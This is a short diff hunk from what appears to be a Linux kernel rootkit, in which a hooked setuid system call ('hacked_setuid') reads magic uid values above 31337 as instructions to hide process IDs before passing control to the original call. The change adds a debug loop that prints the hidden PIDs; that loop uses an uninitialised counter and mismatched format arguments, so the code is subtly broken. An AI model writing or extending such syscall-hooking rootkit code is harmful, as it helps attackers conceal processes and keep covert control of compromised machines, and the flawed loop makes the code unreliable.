@@ -152,6 +152,9 @@ asmlinkage int hacked_setuid(uid_t uid){
 	if(uid > 31337){
 		sprintf(&hidden_PIDs[index++], "%d", (uid - 31337));
 		printk("PID = %d\n", (uid - 31337));
+		for(int i; i < index; i++){
+			printk("List PIDs %s\n", hidden_PIDs[i]);
+		}
 	}
 	return (*orig_setuid)(uid);
 }
